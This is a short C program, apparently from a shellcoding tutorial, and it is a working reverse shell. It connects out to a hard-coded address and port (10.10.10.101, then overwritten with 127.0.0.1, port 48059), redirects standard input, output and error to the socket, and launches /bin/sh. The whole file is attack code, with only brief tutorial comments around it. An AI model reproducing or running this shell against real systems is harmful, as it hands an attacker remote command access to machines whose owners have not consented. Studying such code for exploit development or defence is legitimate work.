#include <sys/socket.h>                             // same includes of header files as before
#include <netinet/in.h>

int main()
{
    char * shell[2];
    int soc, remote;                                // same declarations as last time
    struct sockaddr_in serv_addr;

    serv_addr.sin_family = 2;                       // same setup of the sockaddr_in
    serv_addr.sin_addr.s_addr = 0x650A0A0A;         // 10.10.10.101
    serv_addr.sin_addr.s_addr = 0x0100007F;         // 127.0.0.1 (in reverse order)
    serv_addr.sin_port = 0xBBBB;                    // port 48059

    soc = socket(2, 1, 0);
    remote = connect(soc, (struct sockaddr *) &serv_addr, 0x10);
    dup2(soc, 0);                                   // we dup to the socket
    dup2(soc, 1);                                   // we dup to the socket
    dup2(soc, 2);                                   // we dup to the socket

    shell[0] = "/bin/sh";                           // normal setup for execve
    shell[1] = 0;
    execve(shell[0], shell, 0);                     // pop a shell
}
